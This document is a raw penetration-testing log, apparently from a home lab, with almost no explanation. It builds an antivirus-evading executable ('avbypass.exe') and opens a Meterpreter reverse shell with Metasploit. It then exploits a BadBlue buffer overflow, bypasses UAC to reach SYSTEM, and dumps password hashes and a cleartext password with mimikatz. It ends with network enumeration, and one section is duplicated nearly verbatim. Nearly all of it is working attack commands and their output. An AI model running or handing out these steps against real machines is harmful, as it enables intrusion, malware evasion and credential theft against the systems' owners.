342 INFO: checking Analysis
342 INFO: Building Analysis because out00-Analysis.toc is non existent
342 INFO: Initializing module dependency graph...
358 INFO: Initializing module graph hooks...
358 INFO: running Analysis out00-Analysis.toc
389 INFO: Adding Microsoft.VC90.CRT to dependent assemblies of final executable
  required by c:\python27\python.exe
1106 INFO: Found C:\Windows\WinSxS\Manifests\x86_policy.9.0.microsoft.vc90.crt_1
fc8b3b9a1e18e3b_9.0.30729.1_none_8550c6b5d18a9128.manifest
1106 INFO: Found C:\Windows\WinSxS\Manifests\x86_policy.9.0.microsoft.vc90.crt_1
fc8b3b9a1e18e3b_9.0.30729.4148_none_f47e1bd6f6571810.manifest
1106 INFO: Found C:\Windows\WinSxS\Manifests\x86_policy.9.0.microsoft.vc90.crt_1
fc8b3b9a1e18e3b_9.0.30729.4926_none_f47c47b2f658b4a8.manifest
1154 INFO: Searching for assembly x86_Microsoft.VC90.CRT_1fc8b3b9a1e18e3b_9.0.30
729.4926_none ...
1170 INFO: Found manifest C:\Windows\WinSxS\Manifests\x86_microsoft.vc90.crt_1fc
8b3b9a1e18e3b_9.0.30729.4926_none_508ed732bcbc0e5a.manifest
1170 INFO: Searching for file msvcr90.dll
1170 INFO: Found file C:\Windows\WinSxS\x86_microsoft.vc90.crt_1fc8b3b9a1e18e3b_
9.0.30729.4926_none_508ed732bcbc0e5a\msvcr90.dll
1170 INFO: Searching for file msvcp90.dll
1170 INFO: Found file C:\Windows\WinSxS\x86_microsoft.vc90.crt_1fc8b3b9a1e18e3b_
9.0.30729.4926_none_508ed732bcbc0e5a\msvcp90.dll
1170 INFO: Searching for file msvcm90.dll
1170 INFO: Found file C:\Windows\WinSxS\x86_microsoft.vc90.crt_1fc8b3b9a1e18e3b_
9.0.30729.4926_none_508ed732bcbc0e5a\msvcm90.dll
1200 INFO: Found C:\Windows\WinSxS\Manifests\x86_policy.9.0.microsoft.vc90.crt_1
fc8b3b9a1e18e3b_9.0.30729.1_none_8550c6b5d18a9128.manifest
1200 INFO: Found C:\Windows\WinSxS\Manifests\x86_policy.9.0.microsoft.vc90.crt_1
fc8b3b9a1e18e3b_9.0.30729.4148_none_f47e1bd6f6571810.manifest
1215 INFO: Found C:\Windows\WinSxS\Manifests\x86_policy.9.0.microsoft.vc90.crt_1
fc8b3b9a1e18e3b_9.0.30729.4926_none_f47c47b2f658b4a8.manifest
1215 INFO: Adding redirect Microsoft.VC90.CRT version (9, 0, 21022, 8) -> (9, 0,
 30729, 4926)
1309 INFO: Caching module hooks...
1309 INFO: Analyzing C:\Users\ABCD\Desktop\avbypass.py
2463 INFO: Loading module hooks...
2463 INFO: Loading module hook "hook-encodings.py"...
3026 INFO: Looking for ctypes DLLs
3040 INFO: Analyzing run-time hooks ...
3040 INFO: Looking for dynamic libraries
3197 INFO: Looking for eggs
3197 INFO: Using Python library C:\Windows\system32\python27.dll
3197 INFO: Found binding redirects:
[BindingRedirect(name=u'Microsoft.VC90.CRT', language=None, arch=u'x86', oldVers
ion=(9, 0, 21022, 8), newVersion=(9, 0, 30729, 4926), publicKeyToken=u'1fc8b3b9a
1e18e3b')]
3197 INFO: Warnings written to C:\Python27\Scripts\build\avbypass\warnavbypass.t
xt
3243 INFO: checking PYZ
3243 INFO: Building PYZ because out00-PYZ.toc is non existent
3243 INFO: Building PYZ (ZlibArchive) C:\Python27\Scripts\build\avbypass\out00-P
YZ.pyz
3493 INFO: Building PYZ (ZlibArchive) C:\Python27\Scripts\build\avbypass\out00-P
YZ.pyz completed successfully.
3524 INFO: checking PKG
3524 INFO: Building PKG because out00-PKG.toc is non existent
3524 INFO: Building PKG (CArchive) out00-PKG.pkg
3572 INFO: Redirecting Microsoft.VC90.CRT version (9, 0, 21022, 8) -> (9, 0, 307
29, 4926)
3572 INFO: Updating manifest in C:\Users\ABCD\AppData\Roaming\pyinstaller\bincac
he00_py27_32bit\python27.dll
3572 INFO: Updating resource type 24 name 2 language 1033
3602 INFO: Redirecting Microsoft.VC90.CRT version (9, 0, 21022, 8) -> (9, 0, 307
29, 4926)
4601 INFO: Building PKG (CArchive) out00-PKG.pkg completed successfully.
4616 INFO: Bootloader c:\python27\lib\site-packages\PyInstaller\bootloader\Windo
ws-32bit\runw.exe
4616 INFO: checking EXE
4616 INFO: Building EXE because out00-EXE.toc is non existent
4616 INFO: Building EXE from out00-EXE.toc
4616 INFO: Appending archive to EXE C:\Python27\Scripts\dist\avbypass.exe
4616 INFO: Building EXE from out00-EXE.toc completed successfully.

C:\Python27\Scripts>
Run avbypass.exe after setting up the handler

In Kali
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Starting the payload handler...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49351) at 2017-03-01 16:58:49 -0500

meterpreter > sysinfo
Computer        : ABCD-PC
OS              : Windows 7 (Build 7600).
Architecture    : x86
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x86/win32
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User          Path
 ---   ----  ----                  ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 312   516   svchost.exe
 348   640   WmiPrvSE.exe
 364   348   csrss.exe
 416   348   wininit.exe
 424   408   csrss.exe
 480   408   winlogon.exe
 516   416   services.exe
 524   416   lsass.exe
 532   416   lsm.exe
 640   516   svchost.exe
 700   516   vmacthlp.exe
 744   516   svchost.exe
 860   516   svchost.exe
 920   516   svchost.exe
 964   516   svchost.exe
 1112  516   svchost.exe
 1124  3124  avbypass.exe          x86   1        ABCD-PC\ABCD  C:\Python27\Scripts\dist\avbypass.exe
 1264  516   svchost.exe
 1360  516   spoolsv.exe
 1396  516   svchost.exe
 1408  424   conhost.exe           x86   1        ABCD-PC\ABCD  C:\Windows\system32\conhost.exe
 1520  516   svchost.exe
 1676  516   VGAuthService.exe
 1700  516   vmtoolsd.exe
 1932  2384  firefox.exe           x86   1        ABCD-PC\ABCD  C:\Program Files\Mozilla Firefox\firefox.exe
 1960  516   TPAutoConnSvc.exe
 2032  516   svchost.exe
 2120  2640  cmd.exe               x86   1        ABCD-PC\ABCD  C:\Windows\system32\cmd.exe
 2132  516   msdtc.exe
 2384  2640  firefox.exe           x86   1        ABCD-PC\ABCD  C:\Program Files\Mozilla Firefox\firefox.exe
 2392  860   audiodg.exe           x86   0
 2448  516   svchost.exe
 2524  516   taskhost.exe          x86   1        ABCD-PC\ABCD  C:\Windows\system32\taskhost.exe
 2576  1960  TPAutoConnect.exe     x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2596  424   conhost.exe           x86   1        ABCD-PC\ABCD  C:\Windows\system32\conhost.exe
 2628  920   dwm.exe               x86   1        ABCD-PC\ABCD  C:\Windows\system32\Dwm.exe
 2640  2620  explorer.exe          x86   1        ABCD-PC\ABCD  C:\Windows\Explorer.EXE
 2744  2640  vmtoolsd.exe          x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2912  424   conhost.exe           x86   1        ABCD-PC\ABCD  C:\Windows\system32\conhost.exe
 2956  516   SearchIndexer.exe
 3124  2640  avbypass.exe          x86   1        ABCD-PC\ABCD  C:\Python27\Scripts\dist\avbypass.exe
 3164  516   wmpnetwk.exe
 3316  516   msiexec.exe
 3340  516   svchost.exe
 3668  2640  cmd.exe               x86   1        ABCD-PC\ABCD  C:\Windows\system32\cmd.exe
 3764  516   TrustedInstaller.exe

meterpreter >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Windows 7 Privilege Escalation bypass UAC

msf > search badblue
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                       Disclosure Date  Rank   Description
   ----                                       ---------------  ----   -----------
   exploit/windows/http/badblue_ext_overflow  2003-04-20       great  BadBlue 2.5 EXT.dll Buffer Overflow
   exploit/windows/http/badblue_passthru      2007-12-10       great  BadBlue 2.72b PassThru Buffer Overflow


msf > use exploit/windows/http/badblue_passthru
msf exploit(badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf exploit(badblue_passthru) > set RHOST 192.168.1.14
RHOST => 192.168.1.14
msf exploit(badblue_passthru) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49178) at 2017-03-02 01:28:30 -0500

meterpreter > getuid
Server username: ABCD-PC\ABCD
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
meterpreter > ps

Process List
============

 PID   PPID  Name                    Arch  Session  User          Path
 ---   ----  ----                    ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 360   348   csrss.exe
 376   512   svchost.exe
 412   348   wininit.exe
 420   404   csrss.exe
 468   404   winlogon.exe
 512   412   services.exe
 520   412   lsass.exe
 528   412   lsm.exe
 640   512   svchost.exe
 700   512   vmacthlp.exe
 744   512   svchost.exe
 832   512   svchost.exe
 844   2344  cmd.exe                 x86   1        ABCD-PC\ABCD  C:\Windows\system32\cmd.exe
 924   512   svchost.exe
 968   512   svchost.exe
 1028  832   audiodg.exe             x86   0
 1124  512   svchost.exe
 1260  512   svchost.exe
 1380  512   spoolsv.exe
 1400  512   taskhost.exe
 1420  512   svchost.exe
 1440  640   WmiPrvSE.exe
 1532  512   svchost.exe
 1580  512   dllhost.exe
 1588  512   sppsvc.exe
 1656  512   VGAuthService.exe
 1680  512   vmtoolsd.exe
 1760  2956  SearchFilterHost.exe
 1804  512   WmiApSrv.exe
 1968  512   TPAutoConnSvc.exe
 2032  512   svchost.exe
 2200  512   taskhost.exe            x86   1        ABCD-PC\ABCD  C:\Windows\system32\taskhost.exe
 2248  1968  TPAutoConnect.exe       x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2276  2344  badblue.exe             x86   1        ABCD-PC\ABCD  C:\Program Files\BadBlue\EE\badblue.exe
 2280  420   conhost.exe             x86   1        ABCD-PC\ABCD  C:\Windows\system32\conhost.exe
 2324  924   dwm.exe                 x86   1        ABCD-PC\ABCD  C:\Windows\system32\Dwm.exe
 2344  2304  explorer.exe            x86   1        ABCD-PC\ABCD  C:\Windows\Explorer.EXE
 2464  2344  vmtoolsd.exe            x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2500  420   conhost.exe             x86   1        ABCD-PC\ABCD  C:\Windows\system32\conhost.exe
 2624  512   msdtc.exe
 2736  512   svchost.exe
 2956  512   SearchIndexer.exe
 3056  512   wmpnetwk.exe
 3348  512   svchost.exe
 3504  640   WmiPrvSE.exe
 3852  2956  SearchProtocolHost.exe

meterpreter > migrate 2344
[*] Migrating from 2276 to 2344...
[*] Migration completed successfully.
meterpreter > background
[*] Backgrounding session 1...
msf exploit(badblue_passthru) > use exploit/windows/local/bypassuac
msf exploit(bypassuac) > show options

Module options (exploit/windows/local/bypassuac):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION                     yes       The session to run this module on.
   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf exploit(bypassuac) > sessions -l

Active sessions
===============

  Id  Type                   Information             Connection
  --  ----                   -----------             ----------
  1   meterpreter x86/win32  ABCD-PC\ABCD @ ABCD-PC  192.168.1.13:4444 -> 192.168.1.14:49178 (192.168.1.14)

msf exploit(bypassuac) > set SESSION 1
SESSION => 1
msf exploit(bypassuac) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(bypassuac) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(bypassuac) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 2 opened (192.168.1.13:4444 -> 192.168.1.14:49183) at 2017-03-02 01:32:23 -0500

meterpreter > getuid
Server username: ABCD-PC\ABCD
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > run post/windows/gather/smart_hashdump

[*] Running module against ABCD-PC
[*] Hashes will be saved to the database if one is connected.
[*] Hashes will be saved in loot in JtR password file format to:
[*] /root/.msf4/loot/20170302013510_default_192.168.1.14_windows.hashes_235077.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] 	Obtaining the boot key...
[*] 	Calculating the hboot key using SYSKEY a9e36d32dba6be2903a0af75f9116556...
[*] 	Obtaining the user list and keys...
[*] 	Decrypting user keys...
[*] 	Dumping password hints...
[+] 	ABCD:"same"
[*] 	Dumping password hashes...
[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] 	ABCD:1002:aad3b435b51404eeaad3b435b51404ee:5a13d1af8980f99abe35cc8d72a997dc:::
meterpreter >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Windows 7 hashdump using mimikatz

Prerequisites
1.) Run as system
2.) UAC Bypass


msf > search badblue
[!] Module database cache not built yet, using slow search

Matching Modules
================

   Name                                       Disclosure Date  Rank   Description
   ----                                       ---------------  ----   -----------
   exploit/windows/http/badblue_ext_overflow  2003-04-20       great  BadBlue 2.5 EXT.dll Buffer Overflow
   exploit/windows/http/badblue_passthru      2007-12-10       great  BadBlue 2.72b PassThru Buffer Overflow


msf > use exploit/windows/http/badblue_passthru
msf exploit(badblue_passthru) > show options

Module options (exploit/windows/http/badblue_passthru):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   Proxies                   no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOST                     yes       The target address
   RPORT    80               yes       The target port
   SSL      false            no        Negotiate SSL/TLS for outgoing connections
   VHOST                     no        HTTP server virtual host


Exploit target:

   Id  Name
   --  ----
   0   BadBlue EE 2.7 Universal


msf exploit(badblue_passthru) > set RHOST 192.168.1.14
RHOST => 192.168.1.14
msf exploit(badblue_passthru) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] Trying target BadBlue EE 2.7 Universal...
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 1 opened (192.168.1.13:4444 -> 192.168.1.14:49178) at 2017-03-02 01:28:30 -0500

meterpreter > getuid
Server username: ABCD-PC\ABCD
meterpreter > hashdump
[-] priv_passwd_get_sam_hashes: Operation failed: The parameter is incorrect.
meterpreter > getsystem
[-] priv_elevate_getsystem: Operation failed: Access is denied. The following was attempted:
[-] Named Pipe Impersonation (In Memory/Admin)
[-] Named Pipe Impersonation (Dropper/Admin)
[-] Token Duplication (In Memory/Admin)
meterpreter > ps

Process List
============

 PID   PPID  Name                    Arch  Session  User          Path
 ---   ----  ----                    ----  -------  ----          ----
 0     0     [System Process]
 4     0     System
 272   4     smss.exe
 360   348   csrss.exe
 376   512   svchost.exe
 412   348   wininit.exe
 420   404   csrss.exe
 468   404   winlogon.exe
 512   412   services.exe
 520   412   lsass.exe
 528   412   lsm.exe
 640   512   svchost.exe
 700   512   vmacthlp.exe
 744   512   svchost.exe
 832   512   svchost.exe
 844   2344  cmd.exe                 x86   1        ABCD-PC\ABCD  C:\Windows\system32\cmd.exe
 924   512   svchost.exe
 968   512   svchost.exe
 1028  832   audiodg.exe             x86   0
 1124  512   svchost.exe
 1260  512   svchost.exe
 1380  512   spoolsv.exe
 1400  512   taskhost.exe
 1420  512   svchost.exe
 1440  640   WmiPrvSE.exe
 1532  512   svchost.exe
 1580  512   dllhost.exe
 1588  512   sppsvc.exe
 1656  512   VGAuthService.exe
 1680  512   vmtoolsd.exe
 1760  2956  SearchFilterHost.exe
 1804  512   WmiApSrv.exe
 1968  512   TPAutoConnSvc.exe
 2032  512   svchost.exe
 2200  512   taskhost.exe            x86   1        ABCD-PC\ABCD  C:\Windows\system32\taskhost.exe
 2248  1968  TPAutoConnect.exe       x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2276  2344  badblue.exe             x86   1        ABCD-PC\ABCD  C:\Program Files\BadBlue\EE\badblue.exe
 2280  420   conhost.exe             x86   1        ABCD-PC\ABCD  C:\Windows\system32\conhost.exe
 2324  924   dwm.exe                 x86   1        ABCD-PC\ABCD  C:\Windows\system32\Dwm.exe
 2344  2304  explorer.exe            x86   1        ABCD-PC\ABCD  C:\Windows\Explorer.EXE
 2464  2344  vmtoolsd.exe            x86   1        ABCD-PC\ABCD  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2500  420   conhost.exe             x86   1        ABCD-PC\ABCD  C:\Windows\system32\conhost.exe
 2624  512   msdtc.exe
 2736  512   svchost.exe
 2956  512   SearchIndexer.exe
 3056  512   wmpnetwk.exe
 3348  512   svchost.exe
 3504  640   WmiPrvSE.exe
 3852  2956  SearchProtocolHost.exe

meterpreter > migrate 2344
[*] Migrating from 2276 to 2344...
[*] Migration completed successfully.
meterpreter > background
[*] Backgrounding session 1...
msf exploit(badblue_passthru) > use exploit/windows/local/bypassuac
msf exploit(bypassuac) > show options

Module options (exploit/windows/local/bypassuac):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   SESSION                     yes       The session to run this module on.
   TECHNIQUE  EXE              yes       Technique to use if UAC is turned off (Accepted: PSH, EXE)


Exploit target:

   Id  Name
   --  ----
   0   Windows x86


msf exploit(bypassuac) > sessions -l

Active sessions
===============

  Id  Type                   Information             Connection
  --  ----                   -----------             ----------
  1   meterpreter x86/win32  ABCD-PC\ABCD @ ABCD-PC  192.168.1.13:4444 -> 192.168.1.14:49178 (192.168.1.14)

msf exploit(bypassuac) > set SESSION 1
SESSION => 1
msf exploit(bypassuac) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(bypassuac) > set LHOST 192.168.1.13
LHOST => 192.168.1.13
msf exploit(bypassuac) > exploit

[*] Started reverse TCP handler on 192.168.1.13:4444
[*] UAC is Enabled, checking level...
[+] UAC is set to Default
[+] BypassUAC can bypass this setting, continuing...
[+] Part of Administrators group! Continuing...
[*] Uploaded the agent to the filesystem....
[*] Uploading the bypass UAC executable to the filesystem...
[*] Meterpreter stager executable 73802 bytes long being uploaded..
[*] Sending stage (957999 bytes) to 192.168.1.14
[*] Meterpreter session 2 opened (192.168.1.13:4444 -> 192.168.1.14:49183) at 2017-03-02 01:32:23 -0500

meterpreter > getuid
Server username: ABCD-PC\ABCD
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
meterpreter > run post/windows/gather/smart_hashdump

[*] Running module against ABCD-PC
[*] Hashes will be saved to the database if one is connected.
[*] Hashes will be saved in loot in JtR password file format to:
[*] /root/.msf4/loot/20170302013510_default_192.168.1.14_windows.hashes_235077.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] 	Obtaining the boot key...
[*] 	Calculating the hboot key using SYSKEY a9e36d32dba6be2903a0af75f9116556...
[*] 	Obtaining the user list and keys...
[*] 	Decrypting user keys...
[*] 	Dumping password hints...
[+] 	ABCD:"same"
[*] 	Dumping password hashes...
[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] 	ABCD:1002:aad3b435b51404eeaad3b435b51404ee:5a13d1af8980f99abe35cc8d72a997dc:::
meterpreter > load mimikatz
Loading extension mimikatz...success.
meterpreter > wdigest
[+] Running as SYSTEM
[*] Retrieving wdigest credentials
wdigest credentials
===================

AuthID    Package    Domain        User           Password
------    -------    ------        ----           --------
0;997     Negotiate  NT AUTHORITY  LOCAL SERVICE
0;996     Negotiate  WORKGROUP     ABCD-PC$
0;46262   NTLM
0;999     NTLM       WORKGROUP     ABCD-PC$
0;316544  NTLM       ABCD-PC       ABCD           Ab12345
0;316506  NTLM       ABCD-PC       ABCD           Ab12345

meterpreter > run post/windows/gather/smart_hashdump

[*] Running module against ABCD-PC
[*] Hashes will be saved to the database if one is connected.
[*] Hashes will be saved in loot in JtR password file format to:
[*] /root/.msf4/loot/20170302032757_default_192.168.1.14_windows.hashes_270700.txt
[*] Dumping password hashes...
[*] Running as SYSTEM extracting hashes from registry
[*] 	Obtaining the boot key...
[*] 	Calculating the hboot key using SYSKEY a9e36d32dba6be2903a0af75f9116556...
[*] 	Obtaining the user list and keys...
[*] 	Decrypting user keys...
[*] 	Dumping password hints...
[+] 	ABCD:"same"
[*] 	Dumping password hashes...
[+] 	Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[+] 	ABCD:1002:aad3b435b51404eeaad3b435b51404ee:5a13d1af8980f99abe35cc8d72a997dc:::
meterpreter > hashdump
ABCD:1002:aad3b435b51404eeaad3b435b51404ee:5a13d1af8980f99abe35cc8d72a997dc:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1001:aad3b435b51404eeaad3b435b51404ee:1b70be6a3cf8c8c8bdc3b67bfe479bf8:::

$ cat /root/.msf4/loot/20170302032757_default_192.168.1.14_windows.hashes_270700.txt
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
ABCD:1002:aad3b435b51404eeaad3b435b51404ee:5a13d1af8980f99abe35cc8d72a997dc:::

meterpreter > ps

Process List
============

 PID   PPID  Name               Arch  Session  User                          Path
 ---   ----  ----               ----  -------  ----                          ----
 0     0     [System Process]
 4     0     System             x86   0
 272   4     smss.exe           x86   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 360   348   csrss.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 376   512   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 412   348   wininit.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 420   404   csrss.exe          x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 468   404   winlogon.exe       x86   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 512   412   services.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 520   412   lsass.exe          x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe
 528   412   lsm.exe            x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsm.exe
 640   512   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 700   512   vmacthlp.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 744   512   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 832   512   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 844   2344  cmd.exe            x86   1        ABCD-PC\ABCD                  C:\Windows\system32\cmd.exe
 924   512   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 968   512   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\svchost.exe
 1124  512   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1260  512   svchost.exe        x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\svchost.exe
 1380  512   spoolsv.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1420  512   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1440  640   WmiPrvSE.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\system32\wbem\wmiprvse.exe
 1532  512   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 1580  512   dllhost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\dllhost.exe
 1656  512   VGAuthService.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1680  512   vmtoolsd.exe       x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1968  512   TPAutoConnSvc.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\TPAutoConnSvc.exe
 2032  512   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\system32\svchost.exe
 2200  512   taskhost.exe       x86   1        ABCD-PC\ABCD                  C:\Windows\system32\taskhost.exe
 2248  1968  TPAutoConnect.exe  x86   1        ABCD-PC\ABCD                  C:\Program Files\VMware\VMware Tools\TPAutoConnect.exe
 2276  2344  badblue.exe        x86   1        ABCD-PC\ABCD                  C:\Program Files\BadBlue\EE\badblue.exe
 2280  420   conhost.exe        x86   1        ABCD-PC\ABCD                  C:\Windows\system32\conhost.exe
 2324  924   dwm.exe            x86   1        ABCD-PC\ABCD                  C:\Windows\system32\Dwm.exe
 2344  2304  explorer.exe       x86   1        ABCD-PC\ABCD                  C:\Windows\Explorer.EXE
 2464  2344  vmtoolsd.exe       x86   1        ABCD-PC\ABCD                  C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 2500  420   conhost.exe        x86   1        ABCD-PC\ABCD                  C:\Windows\system32\conhost.exe
 2624  512   msdtc.exe          x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\msdtc.exe
 2736  512   svchost.exe        x86   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 2956  512   SearchIndexer.exe  x86   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\SearchIndexer.exe
 3056  512   wmpnetwk.exe       x86   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Windows Media Player\wmpnetwk.exe
 3244  1188  YDjIsMekrTRqR.exe  x86   1        ABCD-PC\ABCD                  C:\Users\ABCD\AppData\Local\Temp\YDjIsMekrTRqR.exe
 3348  512   svchost.exe        x86   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 4024  2868  UROiWjZ.exe        x86   1        ABCD-PC\ABCD                  C:\Users\ABCD\AppData\Local\Temp\UROiWjZ.exe

meterpreter > migrate 520
[*] Migrating from 4024 to 520...
[*] Migration completed successfully.
meterpreter > hashdump
ABCD:1002:aad3b435b51404eeaad3b435b51404ee:5a13d1af8980f99abe35cc8d72a997dc:::
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
HomeGroupUser$:1001:aad3b435b51404eeaad3b435b51404ee:1b70be6a3cf8c8c8bdc3b67bfe479bf8:::
meterpreter >

+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++

Remote Network Monitoring

meterpreter > ipconfig

Interface  1
============
Name         : Software Loopback Interface 1
Hardware MAC : 00:00:00:00:00:00
MTU          : 4294967295
IPv4 Address : 127.0.0.1
IPv4 Netmask : 255.0.0.0
IPv6 Address : ::1
IPv6 Netmask : ffff:ffff:ffff:ffff:ffff:ffff:ffff:ffff


Interface 11
============
Name         : Intel(R) PRO/1000 MT Network Connection
Hardware MAC : 00:0c:29:4d:b8:a9
MTU          : 1500
IPv4 Address : 192.168.1.14
IPv4 Netmask : 255.255.255.0
IPv6 Address : fe80::49a:c2ca:feba:24d8
IPv6 Netmask : ffff:ffff:ffff:ffff::


Interface 12
============
Name         : Microsoft ISATAP Adapter
Hardware MAC : 00:00:00:00:00:00
MTU          : 1280


Interface 14
============
Name         : Bluetooth Device (Personal Area Network)
Hardware MAC : f4:0f:24:2f:cc:c0
MTU          : 1500
IPv4 Address : 169.254.27.26
IPv4 Netmask : 255.255.0.0
